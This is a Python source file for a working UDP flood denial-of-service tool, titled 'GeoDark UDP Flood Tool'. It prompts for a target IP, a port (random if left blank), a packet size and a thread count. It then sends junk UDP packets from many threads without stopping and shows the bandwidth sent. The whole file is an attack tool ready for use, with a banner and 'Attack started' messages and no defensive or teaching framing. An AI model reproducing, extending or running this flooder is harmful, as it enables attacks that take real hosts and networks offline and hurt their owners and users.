from socket import socket, AF_INET, SOCK_DGRAM
from threading import Thread
from random import randint
from time import time, sleep

from pystyle import *
from getpass import getpass as hinput

ascii = r'''
   _____            _____             _    
  / ____|          |  __ \           | |   
 | |  __  ___  ___ | |  | | __ _ _ __| | __
 | | |_ |/ _ \/ _ \| |  | |/ _` | '__| |/ /
 | |__| |  __/ (_) | |__| | (_| | |  |   < 
  \_____|\___|\___/|_____/ \__,_|_|  |_|\_\
'''

banner = r"""
 @@@@@                                        @@@@@
@@@@@@@                                      @@@@@@@
@@@@@@@           @@@@@@@@@@@@@@@            @@@@@@@
 @@@@@@@@       @@@@@@@@@@@@@@@@@@@        @@@@@@@@
     @@@@@     @@@@@@@@@@@@@@@@@@@@@     @@@@@
       @@@@@  @@@@@@@@@@@@@@@@@@@@@@@  @@@@@
         @@  @@@@@@@@@@@@@@@@@@@@@@@@@  @@
            @@@@@@@    @@@@@@    @@@@@@
            @@@@@@      @@@@      @@@@@
            @@@@@@      @@@@      @@@@@
             @@@@@@    @@@@@@    @@@@@
              @@@@@@@@@@@  @@@@@@@@@@
               @@@@@@@@@@  @@@@@@@@@
           @@   @@@@@@@@@@@@@@@@@   @@
           @@@@  @@@@ @ @ @ @ @@@@  @@@@
          @@@@@   @@@ @ @ @ @ @@@   @@@@@
        @@@@@      @@@@@@@@@@@@@      @@@@@
      @@@@          @@@@@@@@@@@          @@@@
   @@@@@              @@@@@@@              @@@@@
  @@@@@@@                                 @@@@@@@
   @@@@@                                   @@@@@""".replace('▓', '▀')

banner = Add.Add(ascii, banner, center=True)

fluo = Col.light_red
fluo2 = Col.light_blue
white = Col.white
purple = Col.StaticMIX((Col.purple, Col.black, Col.blue))

def init():
    System.Size(140, 40)
    System.Title("GeoDark UDP Flood Tool")
    Cursor.HideCursor()

def stage(text, symbol='...'):
    return f" {Col.Symbol(symbol, white, purple, '{', '}')} {white}{text}"

def error(text, start='\n'):
    hinput(f"{start} {Col.Symbol('!', fluo, white)} {fluo}{text}")
    exit()

class Brutalize:
    def __init__(self, ip, port, force, threads):
        self.ip = ip
        self.port = port
        self.force = force
        self.threads = threads
        self.client = socket(family=AF_INET, type=SOCK_DGRAM)
        self.data = str.encode("X" * self.force)
        self.len = len(self.data)

    def flood(self):
        self.on = True
        self.sent = 0
        for _ in range(self.threads):
            Thread(target=self.send).start()
        Thread(target=self.info).start()

    def send(self):
        while self.on:
            try:
                self.client.sendto(self.data, self._randaddr())
                self.sent += self.len
            except:
                continue

    def stop(self):
        self.on = False

    def info(self):
        interval = 0.05
        now = time()
        size = 0
        self.total = 0
        mb = 1000000
        gb = 1000000000
        multiplier = 8
        while self.on:
            sleep(interval)
            if size != 0:
                self.total += self.sent * multiplier / gb * interval
                print(stage(f"{fluo2}{round(size)} Mbps {purple}-{white} Total: {fluo}{round(self.total, 1)} GB"), end="\r")
            now2 = time()
            if now + 1 >= now2:
                continue
            size = round(self.sent * multiplier / mb)
            self.sent = 0
            now += 1

    def _randaddr(self):
        return (self.ip, self._randport())

    def _randport(self):
        return self.port or randint(1, 65535)

def main():
    init()
    print()
    print(Colorate.Diagonal(Col.DynamicMIX((Col.white, purple)), Center.XCenter(banner)))

    ip = input(stage(f"Target IP {purple}->{fluo2} ", '?'))
    print()
    try:
        if ip.count('.') != 3:
            int('error')
        int(ip.replace('.', ''))
    except:
        error("Invalid IP address.")

    port = input(stage(f"Port (ENTER for random) {purple}->{fluo2} ", '?'))
    print()
    port = None if port == '' else int(port)

    force = input(stage(f"Packet size (ENTER for 1250) {purple}->{fluo2} ", '?'))
    print()
    force = 1250 if force == '' else int(force)

    threads = input(stage(f"Threads (ENTER for 100) {purple}->{fluo2} ", '?'))
    print()
    threads = 100 if threads == '' else int(threads)

    cport = '' if port is None else f':{port}'
    print(stage(f"Attack started {fluo2}{ip}{cport}..."), end='\r')

    attack = Brutalize(ip, port, force, threads)

    try:
        attack.flood()
        while True:
            sleep(1000000)
    except KeyboardInterrupt:
        attack.stop()
        print(stage(f"Attack stopped {fluo2}{ip}{cport} {fluo}{round(attack.total, 1)} GB sent"))
        sleep(1)

    hinput(stage(f"Press ENTER to exit.", '.'))

if __name__ == "__main__":
    main()
